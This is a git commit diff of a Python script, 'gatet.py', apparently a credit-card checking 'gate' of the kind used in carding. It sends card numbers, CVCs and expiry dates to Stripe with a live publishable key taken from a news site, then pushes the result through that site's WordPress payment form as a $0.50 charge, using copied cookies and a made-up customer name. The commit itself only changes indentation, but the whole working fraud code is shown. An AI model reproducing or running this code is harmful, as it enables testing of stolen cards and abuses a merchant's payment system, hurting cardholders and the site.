aee4930c43f71f1106c2d7c7e582592b46c8ef47
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-01-13 04:15:11 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -24,15 +24,16 @@ def Tele(ccx):
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-site',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    }
-    
-    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F44098e0890%3B+stripe-js-v3%2F44098e0890%3B+card-element&referrer=https%3A%2F%2Fnews.dpgazette.com&time_on_page=74526&key=pk_live_51Ozkr9P3o1jZ9Xie1YDNdVUOtcjO80GY4I825jJlYcPmvWZk1GhHloRVAtEFHsM6f7NqTbNv6Tlx2jbi5ANsjjWl00mcNhcCSK'
-    
-    r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-    
-    pm = r1.json()['id']
-    
-    cookies = {
+	}
+
+
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F44098e0890%3B+stripe-js-v3%2F44098e0890%3B+card-element&referrer=https%3A%2F%2Fnews.dpgazette.com&time_on_page=74526&key=pk_live_51Ozkr9P3o1jZ9Xie1YDNdVUOtcjO80GY4I825jJlYcPmvWZk1GhHloRVAtEFHsM6f7NqTbNv6Tlx2jbi5ANsjjWl00mcNhcCSK'
+
+	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+
+	pm = r1.json()['id']
+
+	cookies = {
         'advanced_ads_pro_visitor_referrer': '%7B%22expires%22%3A1768249261%2C%22data%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%7D',
         '_gcl_au': '1.1.2097762215.1736713263',
         '_ga': 'GA1.1.1871403871.1736713263',
@@ -55,9 +56,9 @@ def Tele(ccx):
         'tu-geoip-hide': 'true',
         'FCNEC': '%5B%5B%22AKsRol8lllJNn2-Fk0-dBfZ4n3xyMnmK3dIA2y-jpIT_l3OBsefqddWpxRNEdZee3V_nVaESXBYTo5ta39FSzRVCJIbp-Xe95Lz3yvntV3kcixKFGJ-j8VYH8sZZhAOSYMl-dkT1emVZOxJQ6WuXFo01M7Tn-S1n4w%3D%3D%22%5D%5D',
         '__stripe_sid': '9aff9de5-ce93-4dc9-839b-e40ff0bb3a441a5323',
-    }
-    
-    headers = {
+	}
+
+	headers = {
         'authority': 'news.dpgazette.com',
         'accept': '*/*',
         'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
@@ -73,24 +74,24 @@ def Tele(ccx):
         'sec-fetch-site': 'same-origin',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
         'x-requested-with': 'XMLHttpRequest',
-    }
-    
-    params = {
+	}
+
+	params = {
         't': '1736715380878',
-    }
-    
-    data = {
+	}
+
+	data = {
         'data': '__fluent_form_embded_post_id=14843&_fluentform_9_fluentformnonce=fccf744204&_wp_http_referer=%2Forder-display-ads%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&phone=%2B12084359362&rangeslider=1&checkbox%5B%5D=Leaderboard%20Ad%20Group%20%2430%2FMonth&rangeslider_1=1&numeric-field_1=55&description=&url=&email_1=&custom-payment-amount=0.50&payment_method=stripe&terms-n-condition=on&terms-n-condition_1=on&item__9__fluent_checkme_=&input_radio=&__stripe_payment_method_id='+str(pm)+'',
         'action': 'fluentform_submit',
         'form_id': '9',
-    }
-    
-    r2 = requests.post(
+	}
+
+	r2 = requests.post(
         'https://news.dpgazette.com/wp-admin/admin-ajax.php',
         params=params,
         cookies=cookies,
         headers=headers,
         data=data,
-    )
+	)
 	
 	return (r2.json())
